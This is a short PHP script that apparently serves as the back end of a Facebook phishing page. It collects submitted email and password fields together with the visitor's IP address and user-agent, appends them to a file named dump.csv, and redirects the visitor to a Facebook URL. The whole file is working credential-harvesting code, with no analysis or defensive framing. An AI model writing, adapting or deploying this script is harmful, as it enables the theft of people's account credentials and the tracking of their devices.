<?php
	// Redirect
	header("Location: https://www.facebook.com/7946812724724948964141");
	
	// Get IP address
	$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
	
	// Get user-agent
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	
	// Save credentials, IP address and user-agent
	if(isset($_POST[email]) && isset($_POST[pass])) {$file = fopen("dump.csv", "a");fputcsv($file, array($_POST[email], $_POST[pass], $ip, $useragent));fclose($file);}
	
	// Exit
	exit;
?>